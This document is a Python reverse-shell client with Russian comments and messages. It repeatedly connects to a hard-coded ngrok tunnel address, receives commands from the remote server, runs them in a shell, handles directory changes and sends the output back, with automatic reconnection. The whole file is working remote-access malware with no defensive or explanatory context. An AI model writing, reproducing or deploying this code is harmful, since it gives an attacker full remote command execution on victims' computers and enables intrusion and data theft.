import socket
import os
import subprocess
import time
import tkinter as tk
from tkinter import messagebox

def connect_to_server():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(('2.tcp.eu.ngrok.io', 11907))
            print("Подключено к серверу.")
            return client_socket
        except Exception as e:
            print(f"Ошибка подключения: {e}. Повторная попытка через 5 секунд.")
            time.sleep(5)


def start_client():

    while True:
        client_socket = connect_to_server()

        current_directory = os.getcwd()
        
        try:
            while True:
                try:
                    command = client_socket.recv(1024).decode('utf-8')

                    if command == "KEEP_ALIVE":
                        # Игнорируем команду KEEP_ALIVE
                        continue

                    if command.lower() == 'exit':
                        print("Получена команда на завершение. Разрыв соединения.")
                        return

                    if command.startswith("cd "):
                        path = command.split(" ", 1)[1]
                        try:
                            os.chdir(path)
                            current_directory = os.getcwd()
                            response = f"Текущая директория изменена на: {current_directory}"
                        except Exception as e:
                            response = str(e)
                    else:
                        try:
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                            response = output.decode('utf-8', errors='replace')
                        except subprocess.CalledProcessError as e:
                            response = e.output.decode('utf-8', errors='replace')
                        except Exception as e:
                            response = str(e)

                    response += "END_OF_MSG"
                    client_socket.send(response.encode('utf-8'))

                except ConnectionResetError:
                    print("Соединение с сервером разорвано. Попытка переподключения...")
                    client_socket.close()
                    break
                except Exception as e:
                    print(f"Ошибка на клиенте: {e}")
                    break

        except Exception as e:
            print(f"Ошибка на клиенте вне цикла команд: {e}")
        
        print("Клиент завершил работу. Попытка переподключения...")
        time.sleep(5)

if __name__ == "__main__":
    start_client()
